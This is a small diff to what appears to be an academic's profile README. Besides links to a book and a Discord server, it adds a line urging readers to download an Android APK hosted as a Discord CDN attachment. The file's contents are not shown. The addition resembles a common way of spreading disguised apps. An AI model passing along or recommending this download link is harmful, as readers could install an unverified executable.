@@ -78,4 +78,5 @@ I'am also the coordinator of the Master's in Financial Engineering Programs at t
 
 # - You could find my last Book [here](https://foha2001.github.io/markups-kindle/)
 # - Find out my Discord server [here](https://discord.gg/BrbKfjen) 
+# - You could also download my APP [here](https://cdn.discordapp.com/attachments/1247828064747130922/1249378088949649408/FouedHamouda_18085486.apk?ex=6667be44&is=66666cc4&hm=d1297271a8d23e1c121c2ba8b641d32b26164e7242d19fc036bf44f7cef70bd0&)
 
